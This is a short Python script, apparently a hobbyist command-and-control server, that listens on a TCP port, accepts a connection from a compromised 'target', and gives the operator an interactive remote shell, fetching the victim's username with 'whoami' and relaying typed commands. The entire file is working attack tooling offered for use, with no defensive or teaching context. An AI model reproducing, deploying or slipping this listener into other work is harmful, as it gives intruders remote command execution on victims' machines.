#!/usr/bin/python3

import socket
from termcolor import colored # coloring library
import time

# Getting a shell
def shell():
	
	while True:

		get_username() # getting username of trgt shell

		cmd = input(f"{username}@{ip}~> ") # trgt shell prompt
		trgt.send(cmd.encode('utf-8')) # encoding to binary before sending via socket

		if cmd == 'exit':
			print(colored("\n[-] Closing connection...", 'yellow'))
			time.sleep(2)
			print(colored("[-] Connection Closed\n", 'red'))
			break
		else:
			result = trgt.recv(102400) # received response in binary form 
			print(result.decode('utf-8')) # decoding to text form

# C2 server function
def server():

	global ip
	global trgt
	global sock

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	ip = "0.0.0.0" # listening on any ip, change it (if you wish to)
	port = 1234 # chnage it (if you wish to)

	sock.bind((ip, port)) # binding ip and port to form a method
	sock.listen(5)

	print(colored('''
[+] Listening For Incoming Connections''', 'green'))


	trgt, ip = sock.accept()
	print(colored(f"[+] Connections Established From: {ip}\n", 'green'))


def get_username():

	global username

	username = "whoami" # to know the username of the trgt
	trgt.send(username.encode('utf-8')) # encoding to binary before sending via socket


	username = trgt.recv(102400) # received response in binary form
	username = username.decode('utf-8') # decoding to text form
	
	username = username.strip() # Stripping out EOL spacing


def main():
	server()
	shell()
	sock.close() # Closing listening socket as soon as 'exit' command is used in terminal by C2 server owner to break out of shell() function


if __name__ == '__main__': 
	main()

